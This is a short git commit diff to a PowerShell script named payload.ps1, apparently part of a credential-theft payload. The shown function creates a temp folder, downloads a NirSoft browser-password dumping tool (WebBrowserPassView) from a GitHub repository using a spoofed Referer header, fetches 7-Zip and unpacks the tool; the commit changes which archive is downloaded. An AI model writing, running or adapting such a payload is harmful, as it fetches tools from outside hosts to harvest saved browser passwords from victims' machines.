2f0dc898cdc59e0c09f1eae9e4e4863db25cd43c
Johnathicc <89532293+Johnathicc@users.noreply.github.com>
2024-12-26 20:09:20 -0500

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -3,7 +3,7 @@ function Get-Nirsoft {
 
   mkdir \temp 
   cd \temp
-  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://github.com/Johnathicc/WebPassView/raw/refs/heads/main/passreccommandline.zip -OutFile wbpv.zip
+  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://github.com/Johnathicc/WebPassView/raw/refs/heads/main/WebBrowserPassView.zip -OutFile wbpv.zip
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
   Expand-Archive 7z.zip 
   .\7z\7za.exe e wbpv.zip
